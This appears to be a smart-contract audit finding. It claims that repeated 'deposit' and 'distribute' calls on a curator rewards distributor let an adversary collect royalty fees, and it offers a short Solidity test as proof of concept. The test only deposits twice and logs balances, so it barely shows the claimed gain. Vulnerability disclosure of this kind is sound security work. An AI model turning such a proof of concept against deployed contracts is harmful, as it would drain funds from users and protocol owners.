# Vulnerability details

## Impact
The adversary can exploit the system by orchestrating multiple malicious invocations of 'deposit' and 'distribute' functions to acquire royalty fee.

## Proof of Concept
```
    function testAttack() public{
        uint256 credId = 1;
        uint256 depositAmount = 1 ether;
        vm.deal(owner,2 ether);

        console.log("owner balance:",owner.balance);
        curatorRewardsDistributor.deposit{ value: depositAmount }(credId, depositAmount);
        vm.prank(owner);
        curatorRewardsDistributor.distribute(credId);

        console.log("distribute owner balance:",owner.balance);

        console.log("owner balance:",owner.balance);
        curatorRewardsDistributor.deposit{ value: depositAmount }(credId, depositAmount);
        vm.prank(owner);
        curatorRewardsDistributor.distribute(credId);
        console.log("distribute owner balance:",owner.balance);
    }
```
